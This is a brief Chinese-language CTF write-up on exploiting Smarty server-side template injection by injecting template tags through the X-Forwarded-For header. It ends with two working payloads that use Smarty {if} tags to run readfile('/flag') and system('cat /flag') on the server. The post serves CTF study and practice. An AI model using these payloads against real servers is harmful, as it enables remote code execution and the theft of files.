---
layout: '../../layouts/MarkdownPost.astro'  ## 布局文件
title: 'WEB-smarty模板注入'
pubDate: 2022-010-19
description: '刷题ing'
author: 'Apple Newsroom'
cover:
    url: '../../../public/preview/images/1.png'  ## 宽屏图片
    square: ''  ## 方形图片
    alt: 'cover'
tags: ["CTF", "WEB", "刷题"]
theme: 'dark'
featured: true
---

# WP

## 解题思路

打开容器后，是个这样的界面，注意最下面的Build With Smarty! , 猜测是smarty模板注入。

![](https://i.328888.xyz/2023/03/17/L8hXE.png)

测试模板注入，用bp抓包，然后插入X-Forwarded-For:{$smarty.version}

![](https://i.328888.xyz/2023/03/17/L8d0Q.png)

回显，版本为3.1.30，说明是smarty模板注入
同时回显中也可发现，php版本是7.3.5，那么这样的话<script language="php">phpinfo();</script> ，就无法使用
同时smarty的版本是3，所以{php}{/php}也无法使用。
但是smarty的if标签也可以执行php代码
payload1:

```
{if readfile('/flag')}{/if}
```

payload2:

```
{if system('cat /flag')}{/if}
```
